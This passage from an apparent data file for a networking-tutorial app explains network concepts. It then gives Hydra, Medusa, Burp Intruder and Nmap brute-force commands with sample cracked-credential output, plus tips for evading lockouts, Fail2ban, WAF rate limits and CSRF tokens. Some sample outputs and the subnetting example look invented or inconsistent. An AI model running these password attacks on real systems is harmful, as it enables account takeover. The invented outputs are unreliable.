            "When a frame arrives, bridge looks up destination MAC",
            "If destination is on the same side → drop (filter)",
            "If destination is on other side → forward the frame"
        ],
        "types": [
            {"name": "Transparent Bridge", "desc": "Invisible to hosts. Learns automatically. Standard Ethernet bridging."},
            {"name": "Source-Route Bridge", "desc": "Used in Token Ring. Sender specifies the route."},
            {"name": "Wireless Bridge", "desc": "Connects two wired networks via a Wi-Fi link."}
        ],
        "diagram_steps": [
            {"label": "PC-A sends", "data": "Frame → MAC-BB", "color": "#9b59b6"},
            {"label": "Bridge learns", "data": "MAC-AA on Port 1", "color": "#f39c12"},
            {"label": "Bridge checks", "data": "MAC-BB on Port 2", "color": "#3498db"},
            {"label": "Forward", "data": "Only to Port 2", "color": "#27ae60"}
        ],
        "real_example": "Connecting a Wi-Fi AP to your wired router — the AP acts as a bridge.",
        "key_benefits": ["Reduces collisions", "Extends network range", "Simple to configure"],
        "key_drawbacks": ["Broadcast storms possible", "Slower than switches", "Limited scalability"]
    },
    "routing": {
        "id": "routing",
        "title": "Routing",
        "icon": "🗺️",
        "color": "#27ae60",
        "difficulty": "Intermediate",
        "category": "Layer 3",
        "summary": "The process of selecting paths in a network along which to send data packets between different networks.",
        "why_needed": "The internet is a network of networks. Routers connect them and choose the best path.",
        "how_it_works": [
            "Router receives packet with destination IP",
            "Checks its routing table for the best match",
            "Uses longest-prefix match to select the route",
            "Forwards packet out the appropriate interface",
            "If no route found → sends ICMP 'network unreachable'"
        ],
        "types": [
            {"name": "Static Routing", "desc": "Manually configured routes. No overhead but no auto-recovery."},
            {"name": "Dynamic Routing", "desc": "Routers learn routes automatically via protocols."},
            {"name": "Default Route", "desc": "Catch-all route (0.0.0.0/0) — send everything here if no match."}
        ],
        "diagram_steps": [
            {"label": "PC sends", "data": "Packet → 8.8.8.8", "color": "#27ae60"},
            {"label": "Home router", "data": "Check table → default route", "color": "#f39c12"},
            {"label": "ISP router", "data": "BGP lookup → next-hop", "color": "#3498db"},
            {"label": "Google", "data": "Packet delivered", "color": "#e74c3c"}
        ],
        "real_example": "When you visit a website, your packet hops through ~10-15 routers, each making a routing decision.",
        "key_benefits": ["Enables internet", "Automatic failover (dynamic)", "Load balancing"],
        "key_drawbacks": ["Complex configuration", "Routing loops possible", "Convergence delays"]
    },
    "subnetting": {
        "id": "subnetting",
        "title": "Subnetting",
        "icon": "✂️",
        "color": "#f39c12",
        "difficulty": "Advanced",
        "category": "Addressing",
        "summary": "Dividing a large network into smaller logical sub-networks (subnets) for better organization and security.",
        "why_needed": "Improves performance (less broadcast), security (isolation), and efficient IP usage.",
        "how_it_works": [
            "Take a network (e.g., 192.168.1.0/24)",
            "Borrow bits from the host portion to create subnets",
            "Each subnet gets its own network address and broadcast",
            "Subnet mask defines which bits are network vs host",
            "Devices in different subnets need a router to communicate"
        ],
        "types": [
            {"name": "/24 (256 hosts)", "desc": "Common home network: 192.168.1.0 → 192.168.1.255"},
            {"name": "/25 (128 hosts)", "desc": "Split into two: .0-.127 and .128-.255"},
            {"name": "/26 (64 hosts)", "desc": "Four subnets of 64 addresses each"},
            {"name": "/30 (2 hosts)", "desc": "Perfect for point-to-point router links"}
        ],
        "diagram_steps": [
            {"label": "Original", "data": "192.168.1.0/24 → 256 IPs", "color": "#f39c12"},
            {"label": "Borrow 1 bit", "data": "Mask → /25", "color": "#3498db"},
            {"label": "Subnet A", "data": "192.168.1.0/25 (128 hosts)", "color": "#27ae60"},
            {"label": "Subnet B", "data": "192.168.1.128/25 (128 hosts)", "color": "#9b59b6"}
        ],
        "real_example": "A company splits 192.168.0.0/16 into: HR (10.0.1.0/24), Engineering (10.0.2.0/24), Sales (10.0.3.0/24).",
        "key_benefits": ["Better security", "Reduced broadcast traffic", "Efficient IP allocation"],
        "key_drawbacks": ["Complex math", "Wasted addresses per subnet", "Requires routing"]
    },
    "vlan": {
        "id": "vlan",
        "title": "VLAN (Virtual LAN)",
        "icon": "🏷️",
        "color": "#e74c3c",
        "difficulty": "Intermediate",
        "category": "Layer 2",
        "summary": "Logically segments a physical switch into multiple isolated networks, as if each were a separate switch.",
        "why_needed": "Without VLANs, all devices on a switch are in one broadcast domain. VLANs isolate traffic without extra hardware.",
        "how_it_works": [
            "Switch ports are assigned to VLAN IDs (e.g., VLAN 10, VLAN 20)",
            "Frames are tagged with 802.1Q headers",
            "Devices in same VLAN communicate directly",
            "Devices in different VLANs need a router (or L3 switch)",
            "Trunk ports carry multiple VLANs between switches"
        ],
        "types": [
            {"name": "Access Port", "desc": "Belongs to ONE VLAN. Used for end devices (PC, printer)."},
            {"name": "Trunk Port", "desc": "Carries MULTIPLE VLANs with 802.1Q tags. Used between switches."},
            {"name": "Voice VLAN", "desc": "Dedicated VLAN for VoIP phones for QoS priority."}
        ],
        "diagram_steps": [
            {"label": "PC-HR", "data": "VLAN 10", "color": "#e74c3c"},
            {"label": "Switch", "data": "Tag: 802.1Q VID=10", "color": "#f39c12"},
            {"label": "Trunk", "data": "Carries VLAN 10, 20, 30", "color": "#3498db"},
            {"label": "PC-Sales", "data": "VLAN 20 (isolated)", "color": "#27ae60"}
        ],
        "real_example": "An office building: HR on VLAN 10, Finance on VLAN 20, Guests on VLAN 99 — all on the same physical switches but isolated.",
        "key_benefits": ["Security isolation", "Reduced broadcast domains", "Flexible network design"],
        "key_drawbacks": ["Configuration complexity", "Trunk misconfiguration risks", "Requires L3 for inter-VLAN"]
    },
    "dhcp": {
        "id": "dhcp",
        "title": "DHCP (Dynamic Host Configuration Protocol)",
        "icon": "🎫",
        "color": "#1abc9c",
        "difficulty": "Beginner",
        "category": "Services",
        "summary": "Automatically assigns IP addresses, subnet masks, gateways, and DNS servers to devices joining a network.",
        "why_needed": "Manual IP configuration doesn't scale. DHCP lets devices get online instantly without IT touching them.",
        "how_it_works": [
            "Client broadcasts DHCP DISCOVER (no IP yet)",
            "DHCP server responds with DHCP OFFER (offers an IP)",
            "Client sends DHCP REQUEST (asks for that IP)",
            "Server sends DHCP ACK (confirms lease)",
            "Client configures itself with the leased IP"
        ],
        "types": [
            {"name": "DORA (4-step)", "desc": "Discover → Offer → Request → Acknowledge. Standard process."},
            {"name": "DHCP Relay", "desc": "Forwards DHCP across subnets to central server."},
            {"name": "DHCP Reservation", "desc": "Bind a MAC to always get the same IP."}
        ],
        "diagram_steps": [
            {"label": "Client", "data": "DISCOVER (broadcast)", "color": "#1abc9c"},
            {"label": "Server", "data": "OFFER 192.168.1.50", "color": "#27ae60"},
            {"label": "Client", "data": "REQUEST 192.168.1.50", "color": "#3498db"},
            {"label": "Server", "data": "ACK — lease 24h", "color": "#f39c12"}
        ],
        "real_example": "Connect to any Wi-Fi network — DHCP gives your phone an IP in under a second.",
        "key_benefits": ["Zero-config", "Centralized management", "Prevents IP conflicts"],
        "key_drawbacks": ["Rogue DHCP servers", "Broadcast noise", "Depends on server"]
    },
    "dns": {
        "id": "dns",
        "title": "DNS (Domain Name System)",
        "icon": "📖",
        "color": "#9b59b6",
        "difficulty": "Beginner",
        "category": "Services",
        "summary": "The internet's phone book — translates human-readable names (google.com) to IP addresses (142.250.185.78).",
        "why_needed": "Humans remember names, computers use numbers. DNS bridges the gap.",
        "how_it_works": [
            "Browser asks OS: 'What's the IP of google.com?'",
            "OS asks its configured DNS resolver (e.g., 8.8.8.8)",
            "Resolver checks its cache — if miss, queries root servers",
            "Root → .com TLD → google.com authoritative server",
            "Resolver returns the IP and caches it for future use"
        ],
        "types": [
            {"name": "A Record", "desc": "Maps name → IPv4 address."},
            {"name": "AAAA Record", "desc": "Maps name → IPv6 address."},
            {"name": "CNAME", "desc": "Alias — points to another domain name."},
            {"name": "MX Record", "desc": "Mail server for the domain."},
            {"name": "TXT Record", "desc": "Text info (SPF, DKIM, verification)."},
            {"name": "NS Record", "desc": "Authoritative name servers for the domain."}
        ],
        "diagram_steps": [
            {"label": "Browser", "data": "google.com?", "color": "#9b59b6"},
            {"label": "Resolver", "data": "Cache miss → query", "color": "#f39c12"},
            {"label": "Root/TLD", "data": "Ask .com servers", "color": "#3498db"},
            {"label": "Auth NS", "data": "142.250.185.78", "color": "#27ae60"}
        ],
        "real_example": "When you type 'youtube.com', DNS finds its IP in ~20ms so the browser can connect.",
        "key_benefits": ["Human-friendly", "Global scale", "Caching for speed"],
        "key_drawbacks": ["Single point of failure", "DNS spoofing/cache poisoning", "Propagation delays"]
    },
    "proxy": {
        "id": "proxy",
        "title": "Proxy Server",
        "icon": "🔄",
        "color": "#e67e22",
        "difficulty": "Intermediate",
        "category": "Services",
        "summary": "An intermediary that sits between clients and servers, forwarding requests and responses.",
        "why_needed": "Adds caching, content filtering, anonymity, and security policy enforcement.",
        "how_it_works": [
            "Client sends request to proxy (not directly to server)",
            "Proxy checks cache — if hit, returns immediately",
            "If miss, proxy forwards request to destination server",
            "Server sends response to proxy",
            "Proxy caches and forwards response to client"
        ],
        "types": [
            {"name": "Forward Proxy", "desc": "Sits in front of clients. Hides client identity from servers."},
            {"name": "Reverse Proxy", "desc": "Sits in front of servers. Hides server identity from clients (e.g., Nginx)."},
            {"name": "Transparent Proxy", "desc": "Client doesn't know it's using a proxy. Used by ISPs."},
            {"name": "SOCKS Proxy", "desc": "Layer 5 proxy. Works for any TCP/UDP traffic."}
        ],
        "diagram_steps": [
            {"label": "Client", "data": "GET youtube.com", "color": "#e67e22"},
            {"label": "Proxy", "data": "Cache miss → forward", "color": "#f39c12"},
            {"label": "Server", "data": "200 OK + HTML", "color": "#27ae60"},
            {"label": "Client", "data": "Receives (cached)", "color": "#3498db"}
        ],
        "real_example": "Corporate proxy blocks Facebook during work hours and caches YouTube videos to save bandwidth.",
        "key_benefits": ["Bandwidth savings", "Content filtering", "Anonymity", "Security"],
        "key_drawbacks": ["Single point of failure", "Latency for cache misses", "HTTPS breaks caching"]
    },
    "firewall": {
        "id": "firewall",
        "title": "Firewall",
        "icon": "🔥",
        "color": "#c0392b",
        "difficulty": "Intermediate",
        "category": "Security",
        "summary": "A security barrier that monitors and controls incoming and outgoing network traffic based on rules.",
        "why_needed": "The internet is hostile. Firewalls block unauthorized access while allowing legitimate traffic.",
        "how_it_works": [
            "Packet arrives at firewall",
            "Firewall checks source IP, dest IP, port, protocol",
            "Compares against rule list (top-down)",
            "First matching rule wins (ALLOW or DENY)",
            "If no rule matches → default policy applies"
        ],
        "types": [
            {"name": "Packet Filter", "desc": "Layer 3/4. Stateless. Checks IP/port only."},
            {"name": "Stateful Firewall", "desc": "Layer 4. Tracks connection state. Smarter."},
            {"name": "Application Firewall (WAF)", "desc": "Layer 7. Inspects HTTP content, blocks SQLi, XSS."},
            {"name": "NGFW", "desc": "Next-Gen. Combines all above + IPS, DPI, app awareness."}
        ],
        "diagram_steps": [
            {"label": "Inbound", "data": "SYN → Port 22", "color": "#c0392b"},
            {"label": "Rule check", "data": "DENY SSH from WAN", "color": "#f39c12"},
            {"label": "Action", "data": "DROP packet", "color": "#e74c3c"},
            {"label": "Log", "data": "Security event logged", "color": "#3498db"}
        ],
        "real_example": "Your home router's firewall blocks incoming connections to your devices while allowing your outbound browsing.",
        "key_benefits": ["Blocks attacks", "Access control", "Logging & auditing"],
        "key_drawbacks": ["Can block legit traffic", "Complex rules", "Not enough alone"]
    },
    "load_balancer": {
        "id": "load_balancer",
        "title": "Load Balancer",
        "icon": "⚖️",
        "color": "#16a085",
        "difficulty": "Intermediate",
        "category": "Services",
        "summary": "Distributes incoming network traffic across multiple servers to ensure reliability and performance.",
        "why_needed": "A single server can't handle millions of users. Load balancers spread the load and add redundancy.",
        "how_it_works": [
            "Client request arrives at the load balancer's public IP",
            "LB picks a backend server based on algorithm",
            "Forwards request to that server",
            "Server responds to LB",
            "LB returns response to client (transparent to client)"
        ],
        "types": [
            {"name": "Round Robin", "desc": "Rotates through servers in order."},
            {"name": "Least Connections", "desc": "Sends to server with fewest active connections."},
            {"name": "IP Hash", "desc": "Same client IP → same server (session stickiness)."},
            {"name": "Layer 4 (TCP)", "desc": "Balances based on IP/port. Fast."},
            {"name": "Layer 7 (HTTP)", "desc": "Balances based on URL, cookies, headers. Smart."}
        ],
        "diagram_steps": [
            {"label": "Client", "data": "GET /api/users", "color": "#16a085"},
            {"label": "LB", "data": "Round-robin → Server 2", "color": "#f39c12"},
            {"label": "Server 2", "data": "Process & respond", "color": "#27ae60"},
            {"label": "Client", "data": "Receives response", "color": "#3498db"}
        ],
        "real_example": "Google uses load balancers to serve billions of queries across thousands of servers globally.",
        "key_benefits": ["High availability", "Scalability", "Zero-downtime updates"],
        "key_drawbacks": ["Extra network hop", "Session handling complexity", "Configuration needed"]
    }
}
# ==================== ONLINE BRUTE FORCE TOOLS ====================
ONLINE_TOOLS = [
    {
        "id": "hydra",
        "name": "Hydra",
        "icon": "🐉",
        "color": "#e74c3c",
        "tagline": "The Fastest Network Login Cracker",
        "description": "Hydra is a parallelized login cracker that supports SSH, FTP, HTTP, HTTPS, MySQL, SMB, and 50+ protocols. It uses wordlists to try many passwords rapidly across multiple threads.",
        "install": "sudo apt install hydra",
        "difficulty": "Beginner",
        "speed": "Very Fast",
        "stealth": "Low (noisy)",
        "common_flags": [
            {"flag": "-l", "desc": "Single username"},
            {"flag": "-L", "desc": "Username list file"},
            {"flag": "-p", "desc": "Single password"},
            {"flag": "-P", "desc": "Password list file"},
            {"flag": "-t", "desc": "Parallel tasks (threads)"},
            {"flag": "-f", "desc": "Stop after first valid credential"},
            {"flag": "-V", "desc": "Show each login attempt"},
            {"flag": "-s", "desc": "Custom port"},
            {"flag": "-M", "desc": "List of target hosts"}
        ],
        "examples": [
            {
                "title": "SSH Brute Force",
                "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10",
                "explanation": "Tries username 'admin' with every password in rockyou.txt against SSH.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking ssh://192.168.1.10:22/
[22][ssh] host: 192.168.1.10   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2024-01-15 14:23:45"""
            },
            {
                "title": "HTTP POST Form",
                "command": "hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \"/login.php:username=^USER^&password=^PASS^:Login failed\"",
                "explanation": "Targets web login. `:Login failed` is the failure string; anything else means success.",
                "output": """[DATA] attacking http-post-form://192.168.1.1:80/login.php
[80][http-post-form] host: 192.168.1.1   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found"""
            },
            {
                "title": "Multiple Users + Passwords",
                "command": "hydra -L users.txt -P pass.txt -t 4 -s 2222 ssh://192.168.1.10",
                "explanation": "Uses lists for both. `-t 4` reduces threads to avoid lockout. `-s 2222` custom port.",
                "output": """[DATA] max 4 tasks per 1 server, overall 4 tasks, 120 login tries
[2222][ssh] host: 192.168.1.10   login: root   password: toor
1 of 1 target successfully completed, 1 valid password found"""
            }
        ],
        "failures": [
            {
                "title": "No Password Found (Exhausted Wordlist)",
                "command": "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
                "explanation": "Password isn't in the wordlist. Hydra runs through all 14M passwords and finds nothing.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 14344399 tries in 3600 seconds
[ERROR] 0 valid passwords found
Hydra finished at 2024-01-15 15:23:45

⚠️ Common reasons:
  • Password not in wordlist
  • Correct wordlist needed (e.g. SecLists/Passwords)
  • Target uses strong password policy"""
            },
            {
                "title": "Connection Refused (Port Closed)",
                "command": "hydra -l admin -P rockyou.txt ssh://192.168.1.10",
                "explanation": "SSH service isn't running or firewall blocks the port. Hydra can't even reach the target.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] attacking ssh://192.168.1.10:22/
[ERROR] could not connect to 192.168.1.10:22 - Connection refused
[ERROR] target 192.168.1.10:22 is not reachable
0 of 1 target completed, 0 valid passwords found

⚠️ Troubleshooting:
  • Check with: nmap -p 22 192.168.1.10
  • Firewall may be blocking
  • SSH may be on a different port (-s flag)"""
            },
            {
                "title": "Account Locked After Too Many Attempts",
                "command": "hydra -l admin -P rockyou.txt -t 16 ssh://192.168.1.10",
                "explanation": "High thread count triggers account lockout. All subsequent attempts fail even with correct password.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 1434 tries in 60 seconds
[ERROR] All logins failed - account appears to be locked
[ERROR] 0 valid passwords found

⚠️ Lesson: Reduce threads (-t 4) and add delays
   Or the account may be permanently locked — this is
   a defensive measure to prevent brute force"""
            },
            {
                "title": "Rate Limited / Blocked by Fail2ban",
                "command": "hydra -l admin -P rockyou.txt -t 16 ssh://192.168.1.10",
                "explanation": "Fail2ban or similar detects the attack and blocks your IP after a few attempts.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] attacking ssh://192.168.1.10:22/
[STATUS] 50 tries in 3 seconds
[ERROR] Host is unreachable — connection timed out
[ERROR] 0 valid passwords found

⚠️ Your IP was likely banned by Fail2ban!
   Check: sudo fail2ban-client status sshd
   This is why attackers use slow scans (T0/T1 timing)"""
            },
            {
                "title": "Wrong Service Type",
                "command": "hydra -l admin -P pass.txt ftp://192.168.1.10",
                "explanation": "You targeted FTP but the service is actually SSH. Every attempt fails because the protocol doesn't match.",
                "output": """Hydra v9.4 (c) 2023 by van Hauser/THC
[DATA] attacking ftp://192.168.1.10:21/
[ERROR] Not an FTP service — received SSH banner on port 21
[ERROR] 0 valid passwords found

⚠️ Always confirm service first:
   nmap -sV -p 21,22 192.168.1.10"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Load Wordlist", "desc": "Hydra reads rockyou.txt (14M passwords) into memory", "from": "Attacker", "to": "Hydra", "data": "rockyou.txt loaded", "color": "#e74c3c"},
            {"step": 2, "title": "Attempt #1", "desc": "Try user 'admin' with password '123456'", "from": "Hydra", "to": "SSH Server", "data": "admin:123456", "color": "#3498db"},
            {"step": 3, "title": "Attempt #2", "desc": "Try 'admin:password' — also wrong", "from": "Hydra", "to": "SSH Server", "data": "admin:password", "color": "#3498db"},
            {"step": 4, "title": "Attempt #247", "desc": "Try 'admin:password123' — SUCCESS!", "from": "Hydra", "to": "SSH Server", "data": "admin:password123", "color": "#27ae60"},
            {"step": 5, "title": "Credentials Found", "desc": "Hydra logs and stops (with -f flag)", "from": "SSH Server", "to": "Attacker", "data": "admin:password123 ✓", "color": "#f39c12"}
        ]
    },
    {
        "id": "medusa",
        "name": "Medusa",
        "icon": "🐍",
        "color": "#9b59b6",
        "tagline": "Parallel, Modular Login Brute Forcer",
        "description": "Medusa is a speedy, massively parallel brute-forcer. More stable than Hydra for large-scale attacks.",
        "install": "sudo apt install medusa",
        "difficulty": "Beginner",
        "speed": "Very Fast",
        "stealth": "Low",
        "common_flags": [
            {"flag": "-h", "desc": "Target host"},
            {"flag": "-H", "desc": "Host list file"},
            {"flag": "-u", "desc": "Single username"},
            {"flag": "-U", "desc": "Username list"},
            {"flag": "-p", "desc": "Single password"},
            {"flag": "-P", "desc": "Password list"},
            {"flag": "-M", "desc": "Module (ssh, ftp, http, etc.)"},
            {"flag": "-t", "desc": "Threads per host"},
            {"flag": "-f", "desc": "Stop after first hit"},
            {"flag": "-O", "desc": "Save results"}
        ],
        "examples": [
            {
                "title": "SSH Brute Force",
                "command": "medusa -M ssh -h 192.168.1.10 -u root -P passwords.txt -t 5 -f",
                "explanation": "Targets SSH. `-f` stops at first success. `-t 5` uses 5 threads.",
                "output": """Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun
ACCOUNT FOUND: [ssh] Host: 192.168.1.10 User: root Password: toor [SUCCESS]"""
            },
            {
                "title": "FTP Brute Force",
                "command": "medusa -M ftp -h 192.168.1.10 -U users.txt -P passwords.txt -n 21 -t 5",
                "explanation": "Uses lists for both against FTP port 21.",
                "output": """ACCOUNT FOUND: [ftp] Host: 192.168.1.10 User: ftp Password: ftp [SUCCESS]"""
            },
            {
                "title": "HTTP Form",
                "command": "medusa -h 192.168.1.10 -U users.txt -P pass.txt -M http -m PAGE:'/login.php' -m FORM:'user=^USER&pass=^PASS' -m 'FAIL=Invalid' -t 6",
                "explanation": "Targets web login form. Uses `^USER` and `^PASS` placeholders.",
                "output": """ACCOUNT FOUND: [http] Host: 192.168.1.10 User: admin Password: admin [SUCCESS]"""
            }
        ],
        "failures": [
            {
                "title": "No Valid Credentials Found",
                "command": "medusa -M ssh -h 192.168.1.10 -u root -P passwords.txt -t 5",
                "explanation": "Password list exhausted without a match.",
                "output": """Medusa v2.2 [http://www.foofus.net]
ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root Password: 123456
ACCOUNT CHECK: [ssh] Host: 192.168.1.10 (1 of 1, 0 complete) User: root Password: password
...
ACCOUNT CHECK: [ssh] Host: 192.168.1.10 User: root Password: lastword
ERROR: No valid credentials found after 10000 attempts

⚠️ Suggestions:
  • Try a larger wordlist (rockyou.txt)
  • Verify username is correct
  • Try a hybrid attack with rules"""
            },
            {
                "title": "Module Not Supported",
                "command": "medusa -M telnet -h 192.168.1.10 -u admin -P pass.txt",
                "explanation": "The chosen module isn't installed or supported.",
                "output": """Medusa v2.2 [http://www.foofus.net]
ERROR: Module 'telnet' not found in /usr/lib/medusa/modules
ERROR: Available modules: ssh, ftp, http, mysql, smbnt, vnc, ...

⚠️ Check installed modules:
   ls /usr/lib/medusa/modules/"""
            },
            {
                "title": "Connection Timeout",
                "command": "medusa -M ssh -h 10.0.0.99 -u admin -P pass.txt",
                "explanation": "Target host is unreachable or off.",
                "output": """Medusa v2.2 [http://www.foofus.net]
ERROR: Host 10.0.0.99 not responding on port 22
ERROR: All connection attempts timed out
0 of 1 host completed

⚠️ Verify target reachability:
   ping 10.0.0.99
   nmap -p 22 10.0.0.99"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Select Module", "desc": "Loads SSH module + wordlist", "from": "Attacker", "to": "Medusa", "data": "medusa -M ssh", "color": "#9b59b6"},
            {"step": 2, "title": "Parallel Threads", "desc": "Spawns 5 threads, tests 5 passwords at once", "from": "Medusa", "to": "SSH Server", "data": "5x concurrent tries", "color": "#3498db"},
            {"step": 3, "title": "Thread 3 Succeeds", "desc": "Thread 3 hits correct password", "from": "SSH Server", "to": "Medusa", "data": "root:toor ✓", "color": "#27ae60"},
            {"step": 4, "title": "Stop All Threads", "desc": "Because of -f flag, all threads terminate", "from": "Medusa", "to": "Attacker", "data": "Credentials found", "color": "#f39c12"}
        ]
    },
    {
        "id": "burp",
        "name": "Burp Suite Intruder",
        "icon": "🕷️",
        "color": "#e67e22",
        "tagline": "Web Application Brute Forcing",
        "description": "Burp Suite Intruder is the industry standard for web app brute forcing. Automates customized attacks including credential brute forcing, fuzzing, and parameter enumeration.",
        "install": "Download from portswigger.net (Community free)",
        "difficulty": "Intermediate",
        "speed": "Medium",
        "stealth": "Configurable",
        "common_flags": [
            {"flag": "Sniper", "desc": "Single payload set, one position at a time"},
            {"flag": "Battering Ram", "desc": "Same payload in all positions"},
            {"flag": "Pitchfork", "desc": "Multiple sets, iterate in parallel"},
            {"flag": "Cluster Bomb", "desc": "Multiple sets, all combinations"}
        ],
        "examples": [
            {
                "title": "Cluster Bomb Attack",
                "command": "Intruder → Cluster Bomb → Set username & password payloads",
                "explanation": "Tests every combination of usernames × passwords.",
                "output": """Attack finished
─────────────────────────────────
Request 45: admin / password123 → Status 302, Length 0    ← VALID
Request 46: admin / admin       → Status 200, Length 4523
Request 47: admin / letmein     → Status 200, Length 4523"""
            },
            {
                "title": "Sniper Attack (Password Only)",
                "command": "Intruder → Sniper → Set single payload position on password",
                "explanation": "Best when username is known. Faster than Cluster Bomb.",
                "output": """Payload: password123 → Status 302 (VALID!)
Payload: admin       → Status 200
Payload: letmein     → Status 200"""
            }
        ],
        "failures": [
            {
                "title": "All Attempts Return Same Response",
                "command": "Intruder → Sniper → payload positions",
                "explanation": "Every request returns the same status/length — meaning nothing worked OR you're not detecting success correctly.",
                "output": """Attack finished
─────────────────────────────────
Request 1: admin / test    → Status 200, Length 4523
Request 2: admin / hello   → Status 200, Length 4523
Request 3: admin / admin   → Status 200, Length 4523
Request 4: admin / 123456  → Status 200, Length 4523
...
Request 100: admin / last  → Status 200, Length 4523

⚠️ No valid credential found. Troubleshoot:
   • Check the FAIL/SUCCESS string in response
   • Enable "Follow redirects" — success may be 302
   • Look for a "Welcome" or "Dashboard" string
   • Add CSRF token as a macro"""
            },
            {
                "title": "Account Locked Mid-Attack",
                "command": "Intruder → Attack with 500 threads",
                "explanation": "Too many requests trigger account lockout. Response changes mid-attack.",
                "output": """Attack progress
─────────────────────────────────
Request 1:   Status 200, Length 4523
Request 2:   Status 200, Length 4523
...
Request 30:  Status 200, Length 4523
Request 31:  Status 200, Length 4700  ← Response changed!
Request 32:  Status 423 (Locked), Length 5120
Request 33:  Status 423 (Locked), Length 5120
...
Request 100: Status 423 (Locked), Length 5120

⚠️ Account locked after ~30 attempts!
   Reduce threads in Intruder → Options → "Max concurrent requests"
   Or add a 1-2 second delay between requests"""
            },
            {
                "title": "CSRF Token Blocking Every Request",
                "command": "Intruder → POST /login with static CSRF",
                "explanation": "The web app requires a fresh CSRF token for each request. Every attempt fails because the token is invalid.",
                "output": """Attack finished
─────────────────────────────────
Request 1: admin / test    → Status 403 (CSRF invalid)
Request 2: admin / hello   → Status 403 (CSRF invalid)
...
Request 100: admin / last  → Status 403 (CSRF invalid)

⚠️ CSRF protection detected!
   Fix: Use Burp's "Session Handling Rules"
   1. Create a macro that fetches /login page
   2. Extract the CSRF token via regex
   3. Inject into the login request"""
            },
            {
                "title": "Rate Limited by WAF",
                "command": "Intruder → High-speed attack",
                "explanation": "A Web Application Firewall (Cloudflare, AWS WAF) detects the pattern and blocks you.",
                "output": """Attack progress
─────────────────────────────────
Request 1:    Status 200
Request 50:   Status 200
Request 51:   Status 200
Request 52:   Status 429 (Too Many Requests)
Request 53:   Status 429
Request 100:  Status 429

⚠️ Rate limit hit!
   Mitigations:
   • Slow down Intruder (add delays)
   • Rotate User-Agent headers
   • Use IP rotation via proxy chains
   • Try Burp's "Throttle" option"""
            }
        ],
        "simulation": [
            {"step": 1, "title": "Intercept Request", "desc": "Burp Proxy captures login POST request", "from": "Browser", "to": "Burp Proxy", "data": "POST /login", "color": "#e67e22"},
            {"step": 2, "title": "Send to Intruder", "desc": "Right-click → Send to Intruder", "from": "Proxy", "to": "Intruder", "data": "Request loaded", "color": "#f39c12"},
            {"step": 3, "title": "Set Payload Position", "desc": "Mark username and password fields", "from": "Intruder", "to": "Positions", "data": "§admin§:§password§", "color": "#3498db"},
            {"step": 4, "title": "Load Payload Lists", "desc": "Load users.txt and rockyou.txt", "from": "Intruder", "to": "Payloads", "data": "100 users × 14M pass", "color": "#9b59b6"},
            {"step": 5, "title": "Run Attack", "desc": "Intruder sends requests at high rate", "from": "Intruder", "to": "Server", "data": "142 million requests", "color": "#c0392b"},
            {"step": 6, "title": "Filter Results", "desc": "Sort by Status Code — 302 = success", "from": "Intruder", "to": "Results", "data": "admin:password123 ✓", "color": "#27ae60"}
        ]
    },
    {
        "id": "nmap_brute",
        "name": "Nmap NSE Brute Scripts",
        "icon": "🗺️",
        "color": "#3498db",
        "tagline": "Built-in Brute Force Scripts",
        "description": "Nmap includes NSE scripts that can perform brute-force attacks directly. Great for combining reconnaissance with exploitation.",
        "install": "Already installed with Nmap",
        "difficulty": "Beginner",
        "speed": "Medium",
        "stealth": "Medium",
        "common_flags": [
            {"flag": "--script", "desc": "Run specific NSE script"},
            {"flag": "brute", "desc": "Category of brute-force scripts"},
            {"flag": "--script-args", "desc": "Pass arguments (userdb, passdb)"}
        ],
        "examples": [
            {
                "title": "SSH Brute Force NSE",
                "command": "nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.10",
                "explanation": "Runs SSH brute-force directly from Nmap.",
                "output": """PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     admin:password123 - Valid credentials
|_  Statistics: Performed 156 guesses in 12 seconds"""
            },
            {
                "title": "HTTP Form Brute",
                "command": "nmap -p 80 --script http-brute --script-args http-brute.path=/login.php 192.168.1.10",
                "explanation": "Brute forces HTTP basic auth or form login.",
                "output": """PORT   STATE SERVICE
80/tcp open  http
| http-brute:
|   Accounts:
|     admin:admin - Valid credentials"""
            }
        ],
        "failures": [
            {
                "title": "No Accounts Found",
                "command": "nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.10",
                "explanation": "SSH service rejected all credentials from the wordlist.",
                "output": """PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|_  Accounts: (none found)
|   Statistics: Performed 14344 guesses in 156 seconds

⚠️ Troubleshooting:
  • Verify usernames exist (try 'root', 'admin', 'ubuntu')
  • Try a larger wordlist (rockyou.txt)
  • Check if SSH requires key-only auth (no password allowed)"""
            },
            {
                "title": "Target Refused Connection",
                "command": "nmap -p 22 --script ssh-brute 192.168.1.10",
                "explanation": "SSH not running or firewalled.",
                "output": """PORT   STATE    SERVICE
22/tcp filtered ssh

Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds

⚠️ Port is filtered — SSH might be behind a firewall
   Try scanning other common SSH ports:
   nmap -p 22,2222,8022 --script ssh-brute 192.168.1.10"""
            },
            {
                "title": "NSE Script Error",
                "command": "nmap --script ssh-brute 192.168.1.10",
                "explanation": "Missing dependencies or script version mismatch.",
                "output": """Starting Nmap 7.94
NSE: failed to initialize script engine
